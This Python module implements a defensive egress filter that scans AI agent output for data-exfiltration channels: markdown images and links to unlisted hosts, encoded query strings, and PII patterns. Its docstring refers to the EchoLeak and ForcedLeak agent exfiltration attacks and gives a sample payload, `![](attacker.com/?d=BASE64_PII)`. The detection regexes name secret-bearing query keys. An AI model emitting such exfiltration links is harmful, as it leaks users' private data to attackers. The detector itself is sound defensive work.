"""Markdown / URL egress policy.

Detects EchoLeak/ForcedLeak-style exfiltration channels in agent OUTPUT:
- Markdown image `![](attacker.com/?d=BASE64_PII)` — zero-click exfil
- Markdown links to non-allowlisted hosts with suspicious query strings
- Long base64-looking blobs in plain text
- Direct PII patterns leaking through TTS / chat output

This is the egress side of the EchoLeak CVE-2025-32711 (Microsoft 365 Copilot,
Jun 2025, CVSS 9.3) and ForcedLeak (Salesforce Agentforce, Sep 2025, CVSS 9.4).
"""

from __future__ import annotations

import re
from dataclasses import dataclass

from app.schemas import Finding, Boundary, RiskType


MD_IMAGE_RE = re.compile(r'!\[[^\]]*\]\(([^)\s]+)(?:\s+"[^"]*")?\)')
MD_LINK_RE = re.compile(r'(?<!!)\[[^\]]*\]\(([^)\s]+)(?:\s+"[^"]*")?\)')
BARE_URL_RE = re.compile(r'https?://[^\s)\'"<>]+')

SUSPICIOUS_QUERY_RE = re.compile(
    r'\?(?:[^&]*&)*(?:d|data|leak|token|secret|key|pii|email|customer|user|account)=',
    re.IGNORECASE,
)
LONG_QUERY_VALUE_RE = re.compile(r'=([A-Za-z0-9+/=_-]{30,})')

EMAIL_RE = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
CARD_RE = re.compile(r'\b(?:\d[ -]*?){13,19}\b')
SSN_RE = re.compile(r'\b\d{3}-\d{2}-\d{4}\b')
PHONE_RE = re.compile(r'\b(?:\+?\d{1,3}[- ]?)?(?:\(?\d{3}\)?[- ]?)?\d{3}[- ]?\d{4}\b')

DEFAULT_ALLOWED_HOSTS = {
    "localhost", "127.0.0.1",
    "docs.voxproof", "voxproof.demo",
    "github.com", "arxiv.org",
}


@dataclass
class EgressDecision:
    allowed: bool
    findings: list[Finding]
    blocked_urls: list[str]


class MarkdownEgressPolicy:
    """Inspects agent-bound output for exfiltration channels."""

    def __init__(self, allowed_hosts: set[str] | None = None):
        self.allowed_hosts = allowed_hosts or set(DEFAULT_ALLOWED_HOSTS)

    def inspect(self, text: str, channel: str = "agent_response") -> EgressDecision:
        if not text:
            return EgressDecision(allowed=True, findings=[], blocked_urls=[])

        findings: list[Finding] = []
        blocked: list[str] = []

        # 1. Markdown images — zero-click exfil channel (highest severity)
        for url in MD_IMAGE_RE.findall(text):
            host = self._host(url)
            if not self._is_allowed(host):
                sev = 0.92 if (SUSPICIOUS_QUERY_RE.search(url) or LONG_QUERY_VALUE_RE.search(url)) else 0.80
                findings.append(Finding(
                    boundary=Boundary.EGRESS,
                    risk=RiskType.DATA_EXFILTRATION,
                    severity=sev,
                    evidence=f"Markdown image egress to '{host}' in {channel} — EchoLeak/ForcedLeak-style zero-click exfil (URL: {url[:100]})",
                ))
                blocked.append(url)

        # 2. Markdown links with suspicious queries
        for url in MD_LINK_RE.findall(text):
            host = self._host(url)
            if not self._is_allowed(host) and (SUSPICIOUS_QUERY_RE.search(url) or LONG_QUERY_VALUE_RE.search(url)):
                findings.append(Finding(
                    boundary=Boundary.EGRESS,
                    risk=RiskType.DATA_EXFILTRATION,
                    severity=0.78,
                    evidence=f"Markdown link with suspicious query to '{host}' in {channel} — likely encoded exfil ({url[:80]})",
                ))
                blocked.append(url)

        # 3. Bare URL with long query parameter
        for url in BARE_URL_RE.findall(text)[:5]:
            host = self._host(url)
            if not self._is_allowed(host) and LONG_QUERY_VALUE_RE.search(url):
                findings.append(Finding(
                    boundary=Boundary.EGRESS,
                    risk=RiskType.DATA_EXFILTRATION,
                    severity=0.70,
                    evidence=f"URL with long encoded query to '{host}' in {channel} — exfil candidate",
                ))

        # 4. Plain-text PII in output (TTS will literally read it aloud)
        pii_findings = self._scan_pii(text, channel)
        findings.extend(pii_findings)

        return EgressDecision(
            allowed=not findings or all(f.severity < 0.7 for f in findings),
            findings=findings,
            blocked_urls=blocked,
        )

    def _host(self, url: str) -> str:
        m = re.match(r'(?:https?://)?([^/?\s]+)', url)
        return m.group(1).lower() if m else ""

    def _is_allowed(self, host: str) -> bool:
        if not host:
            return False
        host = host.lower().split(":", 1)[0]
        return any(host == h.lower() or host.endswith("." + h.lower()) for h in self.allowed_hosts)

    def _scan_pii(self, text: str, channel: str) -> list[Finding]:
        out: list[Finding] = []
        if SSN_RE.search(text):
            out.append(Finding(
                boundary=Boundary.EGRESS,
                risk=RiskType.DATA_EXFILTRATION,
                severity=0.88,
                evidence=f"PII leak in {channel}: SSN pattern detected — agent must never read SSN aloud",
            ))
        if CARD_RE.search(text):
            out.append(Finding(
                boundary=Boundary.EGRESS,
                risk=RiskType.DATA_EXFILTRATION,
                severity=0.85,
                evidence=f"PII leak in {channel}: credit-card-shaped digit sequence — risk of reading card aloud over voice",
            ))
        emails = EMAIL_RE.findall(text)
        if len(emails) >= 3:
            out.append(Finding(
                boundary=Boundary.EGRESS,
                risk=RiskType.DATA_EXFILTRATION,
                severity=0.72,
                evidence=f"PII aggregation in {channel}: {len(emails)} email addresses in one response — bulk-read signature",
            ))
        return out
